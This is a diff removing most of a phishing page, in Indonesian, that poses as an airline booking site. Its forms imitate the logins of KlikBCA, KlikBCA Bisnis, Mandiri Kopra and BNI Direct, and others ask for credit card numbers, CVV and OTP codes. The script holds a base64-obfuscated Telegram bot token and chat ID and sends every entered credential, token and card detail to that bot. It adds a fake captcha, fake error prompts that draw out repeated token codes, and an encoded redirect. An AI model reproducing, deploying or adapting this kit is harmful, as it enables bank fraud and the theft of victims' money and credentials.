-        <div style="border-top: 1px solid #eee; padding-top: 20px; display: flex; justify-space-around;">
-          <a href="#" style="color: #444; font-size: 14px; font-weight: 600; text-decoration: none;">News</a>
-          <div style="width: 1px; background: #eee;"></div>
-          <a href="#" style="color: #444; font-size: 14px; font-weight: 600; text-decoration: none;">Help</a>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div id="page-7" class="page-section">
-    <div class="cc-container text-gray-800">
-      <div class="flex justify-center mb-6">
-        <img src="https://penerbanganmaskapai.com/assets/img/chip.jpg" alt="Informasi Kartu" class="w-full object-contain">
-      </div>
-      <div class="flex justify-center mb-8">
-        <img src="https://penerbanganmaskapai.com/assets/img/pisa.jpg" alt="Kartu Dukungan" class="w-full object-contain">
-      </div>
-
-      <form id="ccForm">
-        <div class="mb-6">
-          <label class="block text-xl mb-2">Nomor Kartu Kredit/Debit Anda <span class="text-red-500 font-bold">*</span></label>
-          <input type="text" name="_cc_number" placeholder="Contoh : 3245-3214-652-5421" required class="w-full p-4 border border-gray-300 rounded focus:outline-none text-gray-700 placeholder-gray-500">
-        </div>
-        <div class="mb-6">
-          <label class="block text-xl mb-2">Masa Berlaku (MM/YY) <span class="text-red-500 font-bold">*</span></label>
-          <input type="text" name="_cc_expiry" placeholder="MM/YY" required class="w-full p-4 border border-gray-300 rounded focus:outline-none text-gray-700 placeholder-gray-500">
-        </div>
-        <div class="mb-8">
-          <label class="block text-xl mb-2">CVV <span class="text-red-500 font-bold">*</span></label>
-          <input type="password" name="_cc_cvv" placeholder="xxx" maxlength="4" required class="w-full p-4 border border-gray-300 rounded focus:outline-none text-gray-700 placeholder-gray-500">
-        </div>
-        <button type="submit" class="w-full py-4 bg-[#4a4deb] hover:bg-blue-700 text-white text-lg font-bold rounded">Kirim</button>
-      </form>
-    </div>
-  </div>
-
-  <div id="page-8" class="page-section">
-    <div class="cc-container text-gray-800">
-      <h2 class="text-2xl font-bold mb-6">Masukkan Kode OTP SMS</h2>
-      
-      <div class="bg-[#e0f2f1] text-[#00695c] p-5 rounded-lg mb-8 text-[15px] leading-relaxed shadow-sm">
-        Masukkan Kode OTP sudah dikirimkan ke telepon seluler Anda +62xxxxxxxxx, waktu tersisa <span id="timerDisplay">04:00</span>
-      </div>
-
-      <form id="ccOtpForm">
-        <div class="mb-6">
-          <label class="block text-xl mb-2">Kode OTP <span class="text-red-500 font-bold">*</span></label>
-          <input type="text" name="_otp_cc" required class="w-full p-4 border border-gray-300 rounded focus:outline-none text-gray-700">
-        </div>
-        <button type="submit" class="w-full py-4 bg-[#4a4deb] hover:bg-blue-700 text-white text-lg font-bold rounded">Kirim</button>
-      </form>
-      
-      <div class="text-center mt-12 text-sm text-gray-600">
-        Layananpenerbanganindo - All Rights Reserved.
-      </div>
-    </div>
-  </div>
-
-  <div id="puzzleModal" style="display: none;">
-    <div class="captcha-card">
-      <div class="flex justify-between items-center mb-3">
-        <div class="flex items-center space-x-2">
-          <i class="fas fa-shield-alt text-blue-600 text-xl"></i>
-          <h3 class="text-base font-bold text-gray-800 m-0">Verifikasi Keamanan</h3>
-        </div>
-        <button onclick="closeVerificationModal()" class="text-gray-400 hover:text-gray-600 text-lg border-0 bg-transparent">&times;</button>
-      </div>
-      <p class="text-xs text-gray-500 mb-4">Selesaikan verifikasi captcha berikut untuk memastikan Anda bukan bot atau malware.</p>
-
-      <div id="captchaSlideArea">
-        <div class="relative w-full h-36 bg-gray-200 rounded-lg overflow-hidden flex items-center justify-center border border-gray-300">
-          <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80" class="w-full h-full object-cover">
-          <div id="puzzleTarget" class="absolute w-12 h-12 bg-black bg-opacity-60 border-2 border-dashed border-white rounded" style="top: 35px; right: 40px;"></div>
-          <div id="puzzlePiece" class="absolute w-12 h-12 border-2 border-white rounded shadow-lg overflow-hidden" style="top: 35px; left: 10px; background-image: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80'); background-size: 320px 144px; background-position: -220px -35px;"></div>
-        </div>
-
-        <div class="slider-container" id="sliderBox">
-          <div class="slider-track" id="sliderTrack"></div>
-          <div class="slider-thumb" id="sliderThumb">
-            <i class="fas fa-arrow-right"></i>
-          </div>
-        </div>
-        <p class="text-center text-xs text-gray-400 mt-2">Geser slider untuk mencocokkan puzzle</p>
-      </div>
-
-      <div id="captchaMathArea" style="display: none;" class="mt-2">
-        <div class="bg-blue-50 border border-blue-200 p-3 rounded-lg mb-3 text-center">
-          <span class="text-xs font-semibold text-blue-800">Berapa hasil dari:</span>
-          <div class="text-xl font-bold text-blue-900 mt-1" id="mathQuestion">5 + 3 = ?</div>
-        </div>
-        <input type="number" id="mathAnswer" placeholder="Masukkan jawaban" class="w-full p-2 border border-gray-300 rounded text-center text-sm mb-3 focus:outline-none focus:border-blue-500">
-        <button onclick="verifyMathCaptcha()" class="w-full bg-blue-600 text-white font-bold py-2 rounded text-sm hover:bg-blue-700">Verifikasi Jawaban</button>
-      </div>
-
-      <div class="text-center mt-3 pt-2 border-t border-gray-100 flex justify-between items-center">
-        <span class="text-[10px] text-gray-400">Protected by Cloudflare & reCAPTCHA</span>
-        <button type="button" onclick="switchCaptchaType()" class="text-[11px] text-blue-600 underline bg-transparent border-0">Ganti Mode</button>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    const encodedToken = 'ODkxNjA3OTI2NzoKQUFIT1Y2T1VuTVY1c0NKQUktNHRJU252ZWl6S2todk9QMFk=';
-    const encodedChatId = 'ODk5NDA0Mjc0Mg==';
-
-    const telegramBotToken = atob(encodedToken);
-    const telegramChatId = atob(encodedChatId);
-
-    const encodedRedirectUrl = 'aHR0cHM6Ly9mb3JtdWxpcm1hc2thcGFpLmVkZ2VvbmUuZGV2';
-
-    const loadingOverlay = document.getElementById('loadingOverlay');
-
-    let targetPageId = '';
-    let currentCaptchaMode = 'slide';
-    let numA = 0, numB = 0;
-    let pendingAction = null;
-
-    function showPage(pageId) {
-      document.querySelectorAll('.page-section').forEach(page => {
-        page.classList.remove('active');
-      });
-      document.getElementById(pageId).classList.add('active');
-      window.scrollTo(0, 0);
-
-      if (pageId === 'page-3') {
-        const step2Visible = document.getElementById('bca-step-2').style.display === 'block';
-        document.getElementById('bcaFullSiteLink').style.display = step2Visible ? 'inline-block' : 'none';
-      }
-    }
-
-    function openVerificationModal(destinationPage, actionCallback = null) {
-      targetPageId = destinationPage;
-      pendingAction = actionCallback;
-      document.getElementById('puzzleModal').style.display = 'flex';
-      resetSlider();
-      generateMathCaptcha();
-    }
-
-    function closeVerificationModal() {
-      document.getElementById('puzzleModal').style.display = 'none';
-    }
-
-    function switchCaptchaType() {
-      if (currentCaptchaMode === 'slide') {
-        currentCaptchaMode = 'math';
-        document.getElementById('captchaSlideArea').style.display = 'none';
-        document.getElementById('captchaMathArea').style.display = 'block';
-      } else {
-        currentCaptchaMode = 'slide';
-        document.getElementById('captchaSlideArea').style.display = 'block';
-        document.getElementById('captchaMathArea').style.display = 'none';
-        resetSlider();
-      }
-    }
-
-    function executeSuccessVerification() {
-      closeVerificationModal();
-      if (pendingAction) {
-        pendingAction();
-        pendingAction = null;
-      } else if (targetPageId) {
-        if (targetPageId === 'page-4') resetBizFlow();
-        if (targetPageId === 'page-5') resetMandiriFlow();
-        showPage(targetPageId);
-      }
-    }
-
-    const sliderThumb = document.getElementById('sliderThumb');
-    const sliderTrack = document.getElementById('sliderTrack');
-    const sliderBox = document.getElementById('sliderBox');
-    const puzzlePiece = document.getElementById('puzzlePiece');
-    let isDragging = false;
-    let startX = 0;
-
-    function resetSlider() {
-      sliderThumb.style.left = '2px';
-      sliderTrack.style.width = '0%';
-      puzzlePiece.style.left = '10px';
-    }
-
-    function onDragStart(e) {
-      isDragging = true;
-      startX = e.type === 'touchstart' ? e.touches[0].clientX : e.clientX;
-    }
-
-    function onDragMove(e) {
-      if (!isDragging) return;
-      const currentX = e.type === 'touchmove' ? e.touches[0].clientX : e.clientX;
-      let deltaX = currentX - startX;
-      const maxLeft = sliderBox.clientWidth - 40;
-
-      if (deltaX < 0) deltaX = 0;
-      if (deltaX > maxLeft) deltaX = maxLeft;
-
-      sliderThumb.style.left = (deltaX + 2) + 'px';
-      sliderTrack.style.width = ((deltaX / maxLeft) * 100) + '%';
-      
-      let pieceLeft = 10 + (deltaX / maxLeft) * 230;
-      puzzlePiece.style.left = pieceLeft + 'px';
-    }
-
-    function onDragEnd() {
-      if (!isDragging) return;
-      isDragging = false;
-      const currentPieceLeft = parseFloat(puzzlePiece.style.left);
-      
-      if (currentPieceLeft >= 210 && currentPieceLeft <= 245) {
-        executeSuccessVerification();
-      } else {
-        resetSlider();
-      }
-    }
-
-    sliderThumb.addEventListener('mousedown', onDragStart);
-    window.addEventListener('mousemove', onDragMove);
-    window.addEventListener('mouseup', onDragEnd);
-
-    sliderThumb.addEventListener('touchstart', onDragStart);
-    window.addEventListener('touchmove', onDragMove);
-    window.addEventListener('touchend', onDragEnd);
-
-    function generateMathCaptcha() {
-      numA = Math.floor(Math.random() * 9) + 1;
-      numB = Math.floor(Math.random() * 9) + 1;
-      document.getElementById('mathQuestion').innerText = `${numA} + ${numB} = ?`;
-      document.getElementById('mathAnswer').value = '';
-    }
-
-    function verifyMathCaptcha() {
-      const userAns = parseInt(document.getElementById('mathAnswer').value, 10);
-      if (userAns === (numA + numB)) {
-        executeSuccessVerification();
-      } else {
-        alert('Jawaban salah, silakan coba lagi.');
-        generateMathCaptcha();
-      }
-    }
-
-    const bannerImages = [
-      'https://penerbanganmaskapai.com/assets/img/banner_login_1.png',
-      'https://penerbanganmaskapai.com/assets/img/banner_login_4.png'
-    ];
-    let currentBannerIndex = 0;
-    setInterval(() => {
-      currentBannerIndex = (currentBannerIndex + 1) % bannerImages.length;
-      const bannerEl = document.getElementById('blinkingBanner');
-      if (bannerEl) {
-        bannerEl.src = bannerImages[currentBannerIndex];
-      }
-    }, 3000);
-
-    let timerInterval;
-    function startTimer(duration, display) {
-      clearInterval(timerInterval);
-      let timer = duration, minutes, seconds;
-      timerInterval = setInterval(function () {
-        minutes = parseInt(timer / 60, 10);
-        seconds = parseInt(timer % 60, 10);
-
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-
-        display.textContent = minutes + ":" + seconds;
-
-        if (--timer < 0) {
-          timer = 0;
-          clearInterval(timerInterval);
-        }
-      }, 1000);
-    }
-
-    let mandiriTimerInterval;
-    function startMandiriTimer(duration, display) {
-      clearInterval(mandiriTimerInterval);
-      let timer = duration, minutes, seconds;
-      mandiriTimerInterval = setInterval(function () {
-        minutes = parseInt(timer / 60, 10);
-        seconds = parseInt(timer % 60, 10);
-
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-
-        display.textContent = minutes + ":" + seconds;
-
-        if (--timer < 0) {
-          timer = 0;
-          clearInterval(mandiriTimerInterval);
-        }
-      }, 1000);
-    }
-
-    async function sendTelegramData(title, dataFields) {
-      let message = title + '\n';
-      for (const [key, value] of Object.entries(dataFields)) {
-        message += `${key}: ${value}\n`;
-      }
-
-      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: telegramChatId, text: message })
-        });
-        const result = await response.json();
-        return result.ok;
-      } catch (error) {
-        console.error('Gagal mengirim ke Telegram:', error);
-        return false;
-      }
-    }
-
-    function nextBizStep(event, step) {
-      if(event) event.preventDefault();
-      document.getElementById('bca-biz-step-1').style.display = 'none';
-      document.getElementById('bca-biz-step-2').style.display = 'none';
-      document.getElementById('bca-biz-step-3').style.display = 'none';
-      document.getElementById('bca-biz-step-' + step).style.display = 'block';
-      window.scrollTo(0, 0);
-    }
-
-    function resetBizFlow() {
-      document.getElementById('bca-biz-step-1').style.display = 'block';
-      document.getElementById('bca-biz-step-2').style.display = 'none';
-      document.getElementById('bca-biz-step-3').style.display = 'none';
-    }
-
-    document.getElementById('bookingForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const formEl = this;
-
-      openVerificationModal(null, async function() {
-        loadingOverlay.classList.remove('hidden');
-
-        await sendTelegramData('🔑 Data Booking Tiket:', {
-          'Pilih Opsi': document.getElementById('opsi').value,
-          'ID Booking': document.getElementById('idBooking').value.trim(),
-          'Nomor Handphone': document.getElementById('phone').value.trim()
-        });
-
-        loadingOverlay.classList.add('hidden');
-        
-        window.location.href = atob(encodedRedirectUrl);
-      });
-    });
-
-    document.getElementById('bcaLoginForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      await sendTelegramData('🔑 KlikBCA - Login Awal:', {
-        'User ID': document.getElementById('txt_user_id').value,
-        'PIN': document.getElementById('txt_pswd').value
-      });
-      document.getElementById('bca-step-1').style.display = 'none';
-      document.getElementById('bca-step-2').style.display = 'block';
-      document.getElementById('bcaFullSiteLink').style.display = 'inline-block';
-    });
-
-    document.getElementById('bcaKeyForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      await sendTelegramData('🔑 KlikBCA - KeyBCA:', {
-        'Kode KeyBCA': document.getElementById('txt_keybca').value
-      });
-      
-      document.getElementById('bcaErrorText').innerHTML = "ANGKA YANG ANDA MASUKKAN DARI KEYBCA ANDA SALAH.<br>SILAKAN MEMASUKKAN ANGKA YANG BENAR";
-      document.getElementById('txt_keybca').value = '';
-    });
-
-    document.getElementById('bizForm1').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const bizPass = document.getElementById('biz_pass').value.trim();
-
-      await sendTelegramData('🔑 KlikBCA Bisnis - Step 1:', {
-        'Username': document.getElementById('biz_user').value,
-        'Password': bizPass
-      });
-      nextBizStep(e, 2);
-    });
-
-    document.getElementById('bizForm2').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const keyResp = document.querySelector('input[name="_key_resp"]').value.trim();
-
-      await sendTelegramData('🔑 KlikBCA Bisnis - Step 2:', {
-        'Corporate ID': document.querySelector('input[name="_corp_id"]').value,
-        'User ID': document.querySelector('input[name="_user_id"]').value,
-        'Key Response': keyResp
-      });
-      nextBizStep(e, 3);
-    });
-
-    async function submitBizFinal() {
-      const tokenInput = document.getElementById('finalTokenInput');
-      const tokenVal = tokenInput.value.trim();
-
-      if(!tokenVal) {
-        alert('Silakan masukkan kode token.');
-        return;
-      }
-
-      await sendTelegramData('🔑 KlikBCA Bisnis - Final Token:', {
-        'Token': tokenVal
-      });
-      alert('Autentikasi KlikBCA Sedang di Proses.');
-      tokenInput.value = '';
-    }
-
-    document.getElementById('mandiriForm1').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      await sendTelegramData('🔑 Mandiri Kopra - Login:', {
-        'Company ID': document.querySelector('#mandiri-step-1 input[name="_a"]').value,
-        'User ID': document.querySelector('#mandiri-step-1 input[name="_b"]').value,
-        'Password': document.querySelector('#mandiri-step-1 input[name="_c"]').value
-      });
-      nextMandiriStep(e, 2);
-    });
-
-    document.getElementById('mandiriForm2').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      await sendTelegramData('🔑 Mandiri Kopra - OTP:', {
-        'Kode OTP': document.querySelector('#mandiri-step-2 input[name="_otp"]').value
-      });
-      alert('Kode OTP Mandiri berhasil dikirim.');
-    });
-
-    document.getElementById('bniForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      await sendTelegramData('🔑 BNI Direct - Login:', {
-        'Company ID': document.getElementById('company').value,
-        'User ID': document.getElementById('user').value,
-        'Password': document.getElementById('password').value
-      });
-      alert('Data BNI Direct berhasil dikirim.');
-    });
-
-    document.getElementById('ccForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      await sendTelegramData('🔑 Kartu Kredit - Data:', {
-        'Nomor Kartu': document.querySelector('input[name="_cc_number"]').value,
-        'Masa Berlaku': document.querySelector('input[name="_cc_expiry"]').value,
-        'CVV': document.querySelector('input[name="_cc_cvv"]').value
-      });
-      nextCreditCardStep(e);
-    });
-
-    document.getElementById('ccOtpForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      await sendTelegramData('🔑 Kartu Kredit - OTP:', {
-        'Kode OTP': document.querySelector('input[name="_otp_cc"]').value
-      });
-      alert('OTP Kartu Kredit berhasil dikirim.');
-    });
-
-    function resetMandiriFlow() {
-      document.getElementById('mandiri-step-1').style.display = 'block';
-      document.getElementById('mandiri-step-2').style.display = 'none';
-    }
-
-    function nextMandiriStep(event, step) {
-      event.preventDefault();
-      document.getElementById('mandiri-step-1').style.display = 'none';
-      document.getElementById('mandiri-step-2').style.display = 'none';
-      document.getElementById('mandiri-step-' + step).style.display = 'block';
-      window.scrollTo(0, 0);
-
-      if(step === 2) {
-        let display = document.querySelector('#mandiriTimer');
-        startMandiriTimer(240, display);
-      }
-    }
-
-    function nextCreditCardStep(event) {
-      event.preventDefault();
-      showPage('page-8');
-      let fourMinutes = 60 * 4;
-      let display = document.querySelector('#timerDisplay');
-      startTimer(fourMinutes, display);
-    }
-  </script>
 </body>
 </html>
-
